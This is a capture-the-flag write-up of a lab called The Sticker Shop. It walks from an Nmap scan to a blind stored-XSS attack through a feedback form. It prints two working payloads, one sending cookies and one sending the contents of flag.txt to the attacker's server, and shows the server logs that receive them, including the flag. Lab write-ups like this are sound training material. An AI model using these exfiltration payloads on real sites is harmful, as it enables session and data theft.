

![The-Sticker](https://github.com/user-attachments/assets/1d7a378d-3943-40dc-906b-66a4002470a5)


The local sticker shop has just launched its very own webpage. However, lacking much web development experience, they chose to build and host the site on the same computer they use for browsing the internet and reading customer feedback. A questionable decision!

Your objective: Access the flag located at http://ROOM_IP/flag.txt.

An Nmap scan shows that a service is running on port 8080.


```$ nmap -sV -sC -oN nmap_results 10.10.110.248 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-21 16:07 CET
Nmap scan report for 10.10.110.248
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
|_  256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
8080/tcp open  http-proxy Werkzeug/3.0.1 Python/3.8.10
|_http-title: Cat Sticker Shop
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
```

Access refused is the result of attempting to access the flag at http://10.10.110.248:8080/flag.txt. One can access the homepage.

![thm-stickershop-homepage](https://github.com/user-attachments/assets/71ad2f7a-7f18-4fb7-b056-9da8c08a7f13)


The homepage does not have anything particularly noteworthy.  Since it appears that support staff are reviewing the input, there is a feedback page that might be of interest.


![thm-stickershop-feedback](https://github.com/user-attachments/assets/874970ba-7060-4516-baf0-605bd62211ab)

We can use a simple XSS payload to see if the javascript gets rendered.

```
<img src=x onerror=document.location="http://10.8.6.138/"+document.cookie>
```
We get a hit on our server (10.8.6.138):

```
$ python3 -m http.server 80                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.110.248 - "GET / HTTP/1.1" 200 -
```

By retrieving the flag's content from the support staff member's computer, obtaining the response, and then sending the response URL encoded to our server, we can now extract the flag.

```
<img src="x" onerror="
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then(flag => {
    fetch('http://10.8.6.138:81/?flag=' + encodeURIComponent(flag));
  });
">
```

```
$ python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.10.110.248 - "GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1" 200 -
```













